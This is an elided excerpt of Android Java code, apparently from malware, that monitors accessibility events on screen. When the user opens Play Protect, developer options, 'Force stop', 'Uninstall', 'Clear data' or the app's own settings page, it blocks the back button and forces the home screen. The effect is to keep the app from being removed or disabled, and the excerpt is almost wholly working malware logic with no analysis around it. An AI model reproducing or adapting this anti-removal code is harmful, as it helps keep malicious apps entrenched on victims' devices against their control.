                ...
                try {
                    ...
                    if (Build.VERSION.SDK_INT > 15) {
                        ...
                        try
                        {
                            ...
                            mAdminName = new ComponentName(this, AdminReciver.class);
                            if (!mDPM.isAdminActive(mAdminName)) {
                                if (EvntTEXT.contains("Play Protect".toLowerCase()) || EvntTEXT.contains("Developer Option".toLowerCase()))
                                {
                                    ClassGen12blockBack();
                                    ClassGen12SendMeHome();
                                }
...
//                        }
                        ...
                        if ( EvntTEXT.contains("Force stop".toLowerCase()) || EvntTEXT.contains("Uninstall".toLowerCase()))
                        {
                            // clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        ...
                        if ( EvntTEXT.contains("Clear data".toLowerCase()) || EvntTEXT.contains("clear all data".toLowerCase()))
                        {
                            // clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        ...
                        if (EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("clear all data".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
                        ...
                        if (EvntTEXT.contains(Myname)
                                ...
                                || EvntTEXT.contains(Myname)
                                && EvntTEXT.contains("Apps".toLowerCase()) && !EvntTEXT.contains("Notification".toLowerCase()))
                        {
                            //clickByText("cancel");
                            ClassGen12blockBack();
                            ClassGen12SendMeHome();
